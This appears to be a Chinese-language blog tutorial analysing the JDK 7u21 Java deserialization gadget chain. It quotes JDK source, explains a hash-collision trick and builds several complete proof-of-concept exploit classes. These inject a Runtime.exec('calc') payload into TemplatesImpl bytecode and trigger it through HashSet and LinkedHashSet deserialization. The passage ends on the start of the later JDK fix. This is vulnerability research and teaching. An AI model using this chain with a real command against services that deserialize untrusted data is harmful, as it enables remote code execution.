(memberMethods == null) { memberMethods = AccessController.doPrivileged( new PrivilegedAction\u0026lt;Method[]\u0026gt;() { public Method[] run() { final Method[] mm = type.getDeclaredMethods(); AccessibleObject.setAccessible(mm, true); return mm; } }); } return memberMethods; } //动态代理的hashCode()方法实现 private int hashCodeImpl() { int result = 0; for (Map.Entry\u0026lt;String, Object\u0026gt; e : memberValues.entrySet()) { result += (127 * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue()); } return result; } private static int memberValueHashCode(Object value) { Class\u0026lt;?\u0026gt; type = value.getClass(); if (!type.isArray()) // primitive, string, class, enum const, // or annotation return value.hashCode(); if (type == byte[].class) return Arrays.hashCode((byte[]) value); if (type == char[].class) return Arrays.hashCode((char[]) value); if (type == double[].class) return Arrays.hashCode((double[]) value); if (type == float[].class) return Arrays.hashCode((float[]) value); if (type == int[].class) return Arrays.hashCode((int[]) value); if (type == long[].class) return Arrays.hashCode((long[]) value); if (type == short[].class) return Arrays.hashCode((short[]) value); if (type == boolean[].class) return Arrays.hashCode((boolean[]) value); return Arrays.hashCode((Object[]) value); } 我们注意到在invoke方法内部调用了equalsImpl方法\npublic Object invoke(Object proxy, Method method, Object[] args) { String member = method.getName(); Class\u0026lt;?\u0026gt;[] paramTypes = method.getParameterTypes(); if (member.equals(\u0026#34;equals\u0026#34;) \u0026amp;\u0026amp; paramTypes.length == 1 \u0026amp;\u0026amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); ... } private Boolean equalsImpl(Object o) { ... for (Method memberMethod : getMemberMethods()) { String member = memberMethod.getName(); Object ourValue = memberValues.get(member); Object hisValue = null; AnnotationInvocationHandler hisHandler = asOneOfUs(o); if (hisHandler != null) { hisValue = hisHandler.memberValues.get(member); } else { try { hisValue = memberMethod.invoke(o); } catch (InvocationTargetException e) { return false; } catch (IllegalAccessException e) { throw new AssertionError(e); } } if (!memberValueEquals(ourValue, hisValue)) return false; } return true; } 可以发现equalsImpl方法有一个任意方法调用，但是要求无参。很容易想到TemplatesImpl类，它的newTransformer()方法能够用于动态加载恶意类，符合无参要求\n构造第一部分POC 首先写出TemplatesImpl动态加载的部分。这里为了简化操作，引入Javassist操作字节码\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.CannotCompileException; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import javax.xml.transform.TransformerConfigurationException; import java.io.*; import java.lang.reflect.*; public class jdk7u21Chain { public static class test{ } public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, NotFoundException, CannotCompileException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, TransformerConfigurationException { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.get(test.class.getName()); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass((pool.get(AbstractTranslet.class.getName()))); TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameField.setAccessible(true); nameField.set(templatesImpl,\u0026#34;a\u0026#34;); //由于getTransletInstance中_name=null会retrun null，所以利用反射，将_name赋值 Field bytecodesField = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesField.setAccessible(true); byte[] codes = cc.toBytecode(); byte[][] bytes = new byte[][]{codes}; bytecodesField.set(templatesImpl,bytes); //同理defineTransletClasses中_bytecodes == null会抛出异常，所以将其赋值 Field tfactoryField = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); //本意是为了在defineTransletClasses中，避免_tfactory值为null，导致_tfactory.getExternalExtensionsMap()错误 //但实际上并不影响代码执行 templatesImpl.newTransformer(); } } 接下来开始接上 AnnotationInvocationHandler 的 equals 方法\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.CannotCompileException; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.*; import java.util.*; public class jdk7u21Chain { public static class test{ } public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, NotFoundException, CannotCompileException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.get(test.class.getName()); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass((pool.get(AbstractTranslet.class.getName()))); TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameField.setAccessible(true); nameField.set(templatesImpl,\u0026#34;a\u0026#34;); //由于getTransletInstance中_name=null会retrun null，所以利用反射，将_name赋值 Field bytecodesField = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesField.setAccessible(true); byte[] codes = cc.toBytecode(); byte[][] bytes = new byte[][]{codes}; bytecodesField.set(templatesImpl,bytes); //同理defineTransletClasses中_bytecodes == null会抛出异常，所以将其赋值 Field tfactoryField = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); //本意是为了在defineTransletClasses中，避免_tfactory值为null，导致_tfactory.getExternalExtensionsMap()错误 //但实际上并不影响代码执行 Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; annotationHandlerInvocationHandlerConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); annotationHandlerInvocationHandlerConstructor.setAccessible(true); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); InvocationHandler annotationHandlerInvocationHandler = (InvocationHandler) annotationHandlerInvocationHandlerConstructor.newInstance(Templates.class, hashMap); Templates proxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, annotationHandlerInvocationHandler); proxy.equals(templatesImpl); } } 调用细节：因为proxy调用了equals，所以进入AnnotationInvocationHandler.equals方法\npublic Object invoke(Object proxy, Method method, Object[] args) { String member = method.getName(); //member = \u0026#34;equals\u0026#34; Class\u0026lt;?\u0026gt;[] paramTypes = method.getParameterTypes(); if (member.equals(\u0026#34;equals\u0026#34;) \u0026amp;\u0026amp; paramTypes.length == 1 \u0026amp;\u0026amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); //args[0] = templatesImpl private Boolean equalsImpl(Object o) { //o = templatesImpl ... for (Method memberMethod : getMemberMethods()) { //type = Templates.class //获取Templates.class的Methods //memberMethod = newTransformer String member = memberMethod.getName(); Object ourValue = memberValues.get(member); Object hisValue = null; AnnotationInvocationHandler hisHandler = asOneOfUs(o); if (hisHandler != null) { hisValue = hisHandler.memberValues.get(member); } else { try { hisValue = memberMethod.invoke(o); //newTransformer.invoke(templatesImpl); //调用TemplatesImpl.newTransformer() } catch (InvocationTargetException e) { return false; } catch (IllegalAccessException e) { throw new AssertionError(e); } } if (!memberValueEquals(ourValue, hisValue)) return false; } return true; } 从而执行TemplatesImpl.newTransformer\n构造第二部分POC 接着寻找哪个类会调用equals方法，看到HashMap类\npublic V put(K key, V value) { if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); //根据hash值得到对应的i for (Entry\u0026lt;K,V\u0026gt; e = table[i]; e != null; e = e.next) { //从i开始, 遍历table[i]往后的元素 Object k; if (e.hash == hash \u0026amp;\u0026amp; ((k = e.key) == key || key.equals(k))) { //如果e.hash == hash, 并且e.key != key, 就会进入equals方法 V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(hash, key, value, i); return null; } 在 HashMap.put 内部调用了equals方法，那么让我们研究一下如何进入 key.equals()\n我们知道i（遍历 table 的起始下标）是根据 key 的hash值得到的\nstatic int indexFor(int h, int length) { return h \u0026amp; (length-1); } 如果 table 没有对应的i下标，就会跳过for循环，调用 addEntry 方法，往 table 中添加对应的Entry\nvoid addEntry(int hash, K key, V value, int bucketIndex) { if ((size \u0026gt;= threshold) \u0026amp;\u0026amp; (null != table[bucketIndex])) { resize(2 * table.length); hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); } createEntry(hash, key, value, bucketIndex); } void createEntry(int hash, K key, V value, int bucketIndex) { Entry\u0026lt;K,V\u0026gt; e = table[bucketIndex]; table[bucketIndex] = new Entry\u0026lt;\u0026gt;(hash, key, value, e); size++; } 很明显，如果想让后续的\u0026lt;key, value\u0026gt;进入for循环，那么key的hash值就必须等于已经put的\u0026lt;e.key, e.value\u0026gt;的hash值，即 hash(key) == hash(e.key)\nfor (Entry\u0026lt;K,V\u0026gt; e = table[i]; e != null; e = e.next) { //从i开始, 遍历table[i]往后的元素 Object k; if (e.hash == hash \u0026amp;\u0026amp; ((k = e.key) == key || key.equals(k))) { //如果e.hash == hash, 并且e.key != key, 就会进入equals方法 V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } 要执行 proxy.equals(k)，，就得使 hash(proxy) == hash(templates)，且 proxy != templates（否则不会执行 key.equals(k)语句，这是||的特点）\n看一下HashMap.hash()方法\nfinal int hash(Object k) { int h = 0; if (useAltHashing) { if (k instanceof String) { return sun.misc.Hashing.stringHash32((String) k); } h = hashSeed; } h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h \u0026gt;\u0026gt;\u0026gt; 20) ^ (h \u0026gt;\u0026gt;\u0026gt; 12); return h ^ (h \u0026gt;\u0026gt;\u0026gt; 7) ^ (h \u0026gt;\u0026gt;\u0026gt; 4); } 可以看到hash方法内部调用了hashCode()，因此只有 proxy.hashCode() == templates.hashCode() 成立时，才能调用 proxy.equals()\n计算 proxy 实例的hash值，会进入 AnnotationInvocationHandler.invoke 方法，我们看一下相关的代码\npublic Object invoke(Object proxy, Method method, Object[] args) { String member = method.getName(); Class\u0026lt;?\u0026gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(\u0026#34;equals\u0026#34;) \u0026amp;\u0026amp; paramTypes.length == 1 \u0026amp;\u0026amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); assert paramTypes.length == 0; if (member.equals(\u0026#34;toString\u0026#34;)) return toStringImpl(); if (member.equals(\u0026#34;hashCode\u0026#34;)) return hashCodeImpl(); if (member.equals(\u0026#34;annotationType\u0026#34;)) return type; // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() \u0026amp;\u0026amp; Array.getLength(result) != 0) result = cloneArray(result); return result; } 这里会进入到 hashCodeImpl 方法\nprivate int hashCodeImpl() { int result = 0; for (Map.Entry\u0026lt;String, Object\u0026gt; e : memberValues.entrySet()) { result += (127 * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue()); } return result; } private static int memberValueHashCode(Object value) { Class\u0026lt;?\u0026gt; type = value.getClass(); if (!type.isArray()) // primitive, string, class, enum const, // or annotation return value.hashCode(); ... } 可以发现这里涉及到一个异或的操作，异或操作有一个特性，0 ^ n == n（当时没注意到这里，感谢啦啦0咯咯师傅的启发(づ￣ 3￣)づ），如果 e.getKey().hashCode() == 0，就会变成 result += (e.getValue()).hashCode()。因此，如果 memberValues == new HashMap(\u0026quot;\u0026quot;, templatesImpl)，hashCodeImpl()的结果就变成了templates.hashCode() ，proxy.hashCode()就等于tempatesImpl.hashCode()\n沿着这条思路，构造一下POC\npublic class jdk7u21Chain { public static class test{ } public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, NotFoundException, CannotCompileException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.get(test.class.getName()); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass((pool.get(AbstractTranslet.class.getName()))); TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameField.setAccessible(true); nameField.set(templatesImpl,\u0026#34;a\u0026#34;); //由于getTransletInstance中_name=null会retrun null，所以利用反射，将_name赋值 Field bytecodesField = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesField.setAccessible(true); byte[] codes = cc.toBytecode(); byte[][] bytes = new byte[][]{codes}; bytecodesField.set(templatesImpl,bytes); //同理defineTransletClasses中_bytecodes == null会抛出异常，所以将其赋值 Field tfactoryField = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); //本意是为了在defineTransletClasses中，避免_tfactory值为null，导致_tfactory.getExternalExtensionsMap()错误 //但实际上并不影响代码执行 Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; annotationHandlerInvocationHandlerConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); annotationHandlerInvocationHandlerConstructor.setAccessible(true); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;\u0026#34;, templatesImpl); //让hash(proxy) == hash(templatesImpl) InvocationHandler annotationHandlerInvocationHandler = (InvocationHandler) annotationHandlerInvocationHandlerConstructor.newInstance(Templates.class, hashMap); Templates proxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, annotationHandlerInvocationHandler); // proxy.equals(templatesImpl); HashMap\u0026lt;Object, Object\u0026gt; hashMap1 = new HashMap\u0026lt;\u0026gt;(); hashMap1.put(templatesImpl,\u0026#34;1\u0026#34;); hashMap1.put(proxy, \u0026#34;1\u0026#34;); } } 构造第三部分POC 接着寻找一下哪个方法会调用HashMap.put方法，看到HashSet类\nprivate void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in any hidden serialization magic s.defaultReadObject(); // Read in HashMap capacity and load factor and create backing HashMap int capacity = s.readInt(); float loadFactor = s.readFloat(); map = (((HashSet)this) instanceof LinkedHashSet ? new LinkedHashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor) : new HashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor)); // Read in size int size = s.readInt(); // Read in all elements in the proper order. for (int i=0; i\u0026lt;size; i++) { E e = (E) s.readObject(); map.put(e, PRESENT); } } 这里readObject()就调用了HashMap.put方法，让我们研究一下怎么接上面的Gadget\nmap = (((HashSet)this) instanceof LinkedHashSet ? new LinkedHashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor) : new HashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor)); 要想调用HashMap.put方法，HashSet不为LinkedHashSet即可\n接着看到下面\nfor (int i=0; i\u0026lt;size; i++) { E e = (E) s.readObject(); map.put(e, PRESENT); } 我们还需要向HashSet分别写入e，从而在反序列化时读取e，然后调用hashMap.put(e. PERSENT)\n看一下HashSet.writeObject\nprivate void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException { // Write out any hidden serialization magic s.defaultWriteObject(); // Write out HashMap capacity and load factor s.writeInt(map.capacity()); s.writeFloat(map.loadFactor()); // Write out size s.writeInt(map.size()); // Write out all elements in the proper order. for (E e : map.keySet()) s.writeObject(e); } 这里其实是遍历了hashMap的键值集合，然后写入到输入流s中，因此用HashSet.add方法控制e\npublic boolean add(E e) { return map.put(e, PRESENT)==null; } 梳理完毕之后我们开始构造完整的POC\npublic class jdk7u21Chain { public static class test{ } public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, NotFoundException, CannotCompileException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.get(test.class.getName()); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass((pool.get(AbstractTranslet.class.getName()))); TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameField.setAccessible(true); nameField.set(templatesImpl,\u0026#34;a\u0026#34;); //由于getTransletInstance中_name=null会retrun null，所以利用反射，将_name赋值 Field bytecodesField = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesField.setAccessible(true); byte[] codes = cc.toBytecode(); byte[][] bytes = new byte[][]{codes}; bytecodesField.set(templatesImpl,bytes); //同理defineTransletClasses中_bytecodes == null会抛出异常，所以将其赋值 Field tfactoryField = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); //本意是为了在defineTransletClasses中，避免_tfactory值为null，导致_tfactory.getExternalExtensionsMap()错误 //但实际上并不影响代码执行 Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; annotationHandlerInvocationHandlerConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); annotationHandlerInvocationHandlerConstructor.setAccessible(true); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;\u0026#34;, templatesImpl); //让hash(proxy) == hash(templatesImpl) InvocationHandler annotationHandlerInvocationHandler = (InvocationHandler) annotationHandlerInvocationHandlerConstructor.newInstance(Templates.class, hashMap); Templates proxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, annotationHandlerInvocationHandler); // proxy.equals(templatesImpl); // HashMap\u0026lt;Object, Object\u0026gt; hashMap1 = new HashMap\u0026lt;\u0026gt;(); // hashMap1.put(templatesImpl,\u0026#34;1\u0026#34;); // hashMap1.put(proxy, \u0026#34;1\u0026#34;); HashSet\u0026lt;Object\u0026gt; hashSet = new HashSet\u0026lt;\u0026gt;(); hashSet.add(proxy); //注意先放入proxy hashSet.add(templatesImpl); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashSet); byte[] bytes1 = byteArrayOutputStream.toByteArray(); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes1); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); } } 这里一定要注意add的顺序，先 add(proxy)，再 add(templatesImpl)，不然在序列化的过程中就触发了 TemplatesImpl.newTransformer() 方法，注意 add 的顺序另外一个原因是为了确保反序列化时，调用 hashMap.put 依次存入 templatesImpl、proxy\npublic V put(K key, V value) { .. int hash = hash(key); ... addEntry(hash, key, value, i); return null; } void addEntry(int hash, K key, V value, int bucketIndex) { ... createEntry(hash, key, value, bucketIndex); } void createEntry(int hash, K key, V value, int bucketIndex) { Entry\u0026lt;K,V\u0026gt; e = table[bucketIndex]; table[bucketIndex] = new Entry\u0026lt;\u0026gt;(hash, key, value, e); size++; } 在调用 addEntry(hash, key, value, i) 创建Entry对象时，由于 proxy.hashCode == templatesImpl.hashCode()，即 hash(proxy) == hash(templatesImpl)，它们的hash值相同。因此 templatesImpl 所创建的Entry对象会取代原先 proxy 创建的Entry对象在 table 中的位置，然后将其 next属性指向 proxy 创建的Entry对象，相当于templatesImpl -\u0026gt; proxy\n在反序列化执行时，hashMap.put 的顺序也是hashMap.put(templatesImpl) -\u0026gt; hashMap.put(proxy)\n一箭双雕~\nLinkedHastSet版本的POC public class jdk7u21Chain { public static class test{ } public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, NotFoundException, CannotCompileException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.get(test.class.getName()); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass((pool.get(AbstractTranslet.class.getName()))); TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameField.setAccessible(true); nameField.set(templatesImpl,\u0026#34;a\u0026#34;); //由于getTransletInstance中_name=null会retrun null，所以利用反射，将_name赋值 Field bytecodesField = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesField.setAccessible(true); byte[] codes = cc.toBytecode(); byte[][] bytes = new byte[][]{codes}; bytecodesField.set(templatesImpl,bytes); //同理defineTransletClasses中_bytecodes == null会抛出异常，所以将其赋值 Field tfactoryField = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); //本意是为了在defineTransletClasses中，避免_tfactory值为null，导致_tfactory.getExternalExtensionsMap()错误 //但实际上并不影响代码执行 Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; annotationHandlerInvocationHandlerConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); annotationHandlerInvocationHandlerConstructor.setAccessible(true); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;f5a5a608\u0026#34;, \u0026#34;Override\u0026#34;); //\u0026#34;f5a5a608\u0026#34;.hashCode() == 0 InvocationHandler annotationHandlerInvocationHandler = (InvocationHandler) annotationHandlerInvocationHandlerConstructor.newInstance(Templates.class, hashMap); Templates proxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, annotationHandlerInvocationHandler); // proxy.equals(templatesImpl); // HashMap\u0026lt;Object, Object\u0026gt; hashMap1 = new HashMap\u0026lt;\u0026gt;(); // hashMap1.put(templatesImpl,\u0026#34;1\u0026#34;); // hashMap1.put(proxy, \u0026#34;1\u0026#34;); HashSet\u0026lt;Object\u0026gt; set = new LinkedHashSet\u0026lt;\u0026gt;(); set.add(templatesImpl); set.add(proxy); hashMap.put(\u0026#34;f5a5a608\u0026#34;, templatesImpl); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(set); byte[] bytes1 = byteArrayOutputStream.toByteArray(); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes1); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); } } 这个版本的POC和上面自己写的POC主要区别就在于LinkedHashSet的使用上，LinkedHashSet继承自HashSet\n可以看一下HashSet的readObject方法\nprivate void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in any hidden serialization magic s.defaultReadObject(); // Read in HashMap capacity and load factor and create backing HashMap int capacity = s.readInt(); float loadFactor = s.readFloat(); map = (((HashSet)this) instanceof LinkedHashSet ? new LinkedHashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor) : new HashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor)); // Read in size int size = s.readInt(); // Read in all elements in the proper order. for (int i=0; i\u0026lt;size; i++) { E e = (E) s.readObject(); map.put(e, PRESENT); } } 如果为LinkedHashSet，map就等于LinkedHashMap。而LinkedHashMap也继承自HashMap\npublic V put(K key, V value) { if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); for (Entry\u0026lt;K,V\u0026gt; e = table[i]; e != null; e = e.next) { Object k; if (e.hash == hash \u0026amp;\u0026amp; ((k = e.key) == key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(hash, key, value, i); return null; } LinkedHashMap重写了HashMap的addEntry和createEntry方法\n//HashMap void addEntry(int hash, K key, V value, int bucketIndex) { if ((size \u0026gt;= threshold) \u0026amp;\u0026amp; (null != table[bucketIndex])) { resize(2 * table.length); hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); } createEntry(hash, key, value, bucketIndex); } //LinkedHashMap void addEntry(int hash, K key, V value, int bucketIndex) { super.addEntry(hash, key, value, bucketIndex); // Remove eldest entry if instructed Entry\u0026lt;K,V\u0026gt; eldest = header.after; if (removeEldestEntry(eldest)) { //不用管这里 removeEntryForKey(eldest.key); } } //HashMap void createEntry(int hash, K key, V value, int bucketIndex) { Entry\u0026lt;K,V\u0026gt; e = table[bucketIndex]; table[bucketIndex] = new Entry\u0026lt;\u0026gt;(hash, key, value, e); size++; } //LinkedHashMap void createEntry(int hash, K key, V value, int bucketIndex) { HashMap.Entry\u0026lt;K,V\u0026gt; old = table[bucketIndex]; Entry\u0026lt;K,V\u0026gt; e = new Entry\u0026lt;\u0026gt;(hash, key, value, old); table[bucketIndex] = e; //实际上就是table[bucketIndex] = new Entry\u0026lt;\u0026gt;(hash, key, value, e); e.addBefore(header); size++; } //LinkedHashMap private void addBefore(Entry\u0026lt;K,V\u0026gt; existingEntry) { after = existingEntry; before = existingEntry.before; before.after = this; after.before = this; } 可以看到LinkedHashMap的createEntry方法多了一个addBefore方法\n四行代码，总共分四步。\n1、将新添加的数据指向后方的数据指向header。\n2、将新添加的数据指向前方的数据指向原来header前方指向的数据。这样新添加数据的前后方都指明白了。\n3、将新添加数据前方的数据指向后方的指向自己。\n4、将新添加后方的数据就是header的指向前方的数据指向自己。这样讲别人指向自己的也指明白了\n5，每次添加都是在header前方添加。添加的数据前方指向倒数第二次添加的数据，倒数第二次添加数据的前方指向的是倒数第三次添加的数据，这样数据就全部链起来了。这一种是按照插入顺序进行排序的。\nhttps://blog.csdn.net/qq_38859786/article/details/96146902\nLinkedHashMap.put方法相比于HashMap.put方法，就是保证了存入Entry的数据按照插入顺序排序\n这有什么用呢？看到HashSet.writeObject\nprivate void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException { ... for (E e : map.keySet()) s.writeObject(e); } //HashMap public Set\u0026lt;K\u0026gt; keySet() { Set\u0026lt;K\u0026gt; ks = keySet; return (ks != null ? ks : (keySet = new KeySet())); } private final class KeySet extends AbstractSet\u0026lt;K\u0026gt; { public Iterator\u0026lt;K\u0026gt; iterator() { return newKeyIterator(); } ... } Iterator\u0026lt;K\u0026gt; newKeyIterator() { return new KeyIterator(); } private final class KeyIterator extends HashIterator\u0026lt;K\u0026gt; { public K next() { return nextEntry().getKey(); } } 可以看到这里是按照Entry内部排序，依次将Entry中的templatesImpl、proxy写入到输入流中的\nHashSet\u0026lt;Object\u0026gt; set = new LinkedHashSet\u0026lt;\u0026gt;(); set.add(templatesImpl); set.add(proxy); hashMap.put(\u0026#34;f5a5a608\u0026#34;, templatesImpl); 还有一处区别是\nHashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;f5a5a608\u0026#34;, \u0026#34;Override\u0026#34;); //\u0026#34;f5a5a608\u0026#34;.hashCode() == 0 InvocationHandler annotationHandlerInvocationHandler = (InvocationHandler) annotationHandlerInvocationHandlerConstructor.newInstance(Templates.class, hashMap); Templates proxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, annotationHandlerInvocationHandler); // proxy.equals(templatesImpl); // HashMap\u0026lt;Object, Object\u0026gt; hashMap1 = new HashMap\u0026lt;\u0026gt;(); // hashMap1.put(templatesImpl,\u0026#34;1\u0026#34;); // hashMap1.put(proxy, \u0026#34;1\u0026#34;); HashSet\u0026lt;Object\u0026gt; set = new LinkedHashSet\u0026lt;\u0026gt;(); set.add(templatesImpl); set.add(proxy); hashMap.put(\u0026#34;f5a5a608\u0026#34;, templatesImpl); \u0026quot;f5a5a608\u0026quot;和\u0026quot;\u0026quot;的作用类似，他们调用hashCode方法的值都为0\n这里先放入无效值\u0026quot;Override\u0026quot;\nHashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;f5a5a608\u0026#34;, \u0026#34;Override\u0026#34;); 是为了不让程序运行到set.add时，走进TemplatesImpl.newTransformer()流程，导致序列化失败\n而后面放入templatesImpl\nhashMap.put(\u0026#34;f5a5a608\u0026#34;, templatesImpl); 则是为了覆盖原先占位的\u0026quot;Override\u0026quot;，让其在反序列化时进入TemplatesImpl.newTransformer()来加载恶意类，进行命令执行\n高版本修复 JDK7u25-b03(2013-06-18)修补方案\n//JDK7u21 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } 